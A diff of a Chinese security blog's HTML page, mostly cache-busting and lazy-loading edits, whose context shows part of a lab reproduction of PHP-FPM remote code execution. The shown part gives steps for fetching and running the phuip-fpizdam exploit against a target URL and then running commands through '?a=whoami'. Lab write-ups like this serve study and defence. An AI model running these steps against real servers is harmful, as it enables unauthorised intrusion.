@@ -4,7 +4,7 @@
 <meta name="viewport" content="width=device-width, initial-scale=1" />
 <title>斯文beast</title>
 <meta name="description" content="不在平静中灭亡~  " />
-<link rel="shortcut icon" href="http://www.svenbeast.com//favicon.ico?v=1581935936254">
+<link rel="shortcut icon" href="http://www.svenbeast.com//favicon.ico?v=1582079012028">
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
 <link href="https://cdn.remixicon.com/releases/v1.3.1/remixicon.css" rel="stylesheet">
 <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
@@ -33,7 +33,7 @@
       <div class="flex lg:block p-4 lg:px-0 items-center fixed lg:static lg:block top-0 right-0 left-0 bg-white z-50">
         <i class="remixicon-menu-2-line lg:mt-4 text-2xl cursor-pointer animated fadeIn" onclick="openMenu()"></i>
         <a href="http://www.svenbeast.com/">
-          <img class="animated fadeInLeft avatar rounded-lg mx-4 lg:mt-32 lg:mx-0 mt-0 lg:w-24 lg:h-24 w-12 w-12" src="http://www.svenbeast.com//images/avatar.png?v=1581935936254" alt="">
+          <img class="animated fadeInLeft avatar rounded-lg mx-4 lg:mt-32 lg:mx-0 mt-0 lg:w-24 lg:h-24 w-12 w-12" src="http://www.svenbeast.com//images/avatar.png?v=1582079012028" alt="">
         </a>
         <h1 class="animated fadeInLeft lg:text-4xl font-extrabold lg:mt-8 mt-0 text-xl" style="animation-delay: 0.2s">斯文beast</h1>
       </div>
@@ -153,30 +153,30 @@ service docker start
 sudo docker-compose up -d
 访问 http://靶机ip:8080/index.php
 </code></pre>
-<figure data-type="image" tabindex="1"><img src="http://www.svenbeast.com//post-images/1571910239956.png" alt=""></figure>
+<figure data-type="image" tabindex="1"><img src="http://www.svenbeast.com//post-images/1571910239956.png" alt="" loading="lazy"></figure>
 <h3 id="0x04-漏洞利用">0x04 漏洞利用</h3>
 <pre><code>poc是使用go语言编写的，这里已经编译好exe，提供下载
 链接: https://pan.baidu.com/s/1bbV15sw-Yx-PX3LFIE2ggA 提取码: sven
 </code></pre>
 <ul>
 <li>usage：phuip-fpizdam.exe http://192.168.43.21:8080/index.php<br>
-<img src="http://www.svenbeast.com//post-images/1571911181021.png" alt=""></li>
+<img src="http://www.svenbeast.com//post-images/1571911181021.png" alt="" loading="lazy"></li>
 </ul>
 <pre><code>有go语言环境的可以直接运行
 git clone https://github.com/neex/phuip-fpizdam.git
 cd phuip-fpizdam
 go run . &quot;http://your-ip:8080/index.php&quot;
 </code></pre>
-<figure data-type="image" tabindex="2"><img src="http://www.svenbeast.com//post-images/1571910958896.png" alt=""></figure>
+<figure data-type="image" tabindex="2"><img src="http://www.svenbeast.com//post-images/1571910958896.png" alt="" loading="lazy"></figure>
 <ul>
 <li>
 <p>poc运行完毕后可以直接远程代码执行，?a=whoami<br>
 usage:输入命令后，需要多执行几次刷新，以访问到被污染的进程。<br>
-<img src="http://www.svenbeast.com//post-images/1571911526452.png" alt=""></p>
+<img src="http://www.svenbeast.com//post-images/1571911526452.png" alt="" loading="lazy"></p>
 </li>
 <li>
 <p>index.php源码<br>
-<img src="http://www.svenbeast.com//post-images/1571911584720.png" alt=""></p>
+<img src="http://www.svenbeast.com//post-images/1571911584720.png" alt="" loading="lazy"></p>
 </li>
 </ul>
 <h3 id="0x05-漏洞成因">0x05 漏洞成因</h3>
@@ -193,7 +193,7 @@ https://github.com/php/php-src/blob/master/sapi/fpm/fpm/fpm_main.c#L1150
         <div class="flex justify-between py-8">
           
             <div class="prev-post">
-              <a href="http://www.svenbeast.com//post/QmuCuXJa9">
+              <a href="http://www.svenbeast.com/post/QmuCuXJa9/">
                 <h3 class="post-title">
                   <i class="remixicon-arrow-left-line"></i>
                   Apache Solr Velocity远程代码执行漏洞利用
@@ -204,7 +204,7 @@ https://github.com/php/php-src/blob/master/sapi/fpm/fpm/fpm_main.c#L1150
 
           
             <div class="next-post">
-              <a href="http://www.svenbeast.com//post/c0VE5mjC-">
+              <a href="http://www.svenbeast.com/post/c0VE5mjC-/">
                 <h3 class="post-title">
                   fastjson&lt;=1.2.47反序列化漏洞复现
                   <i class="remixicon-arrow-right-line"></i>
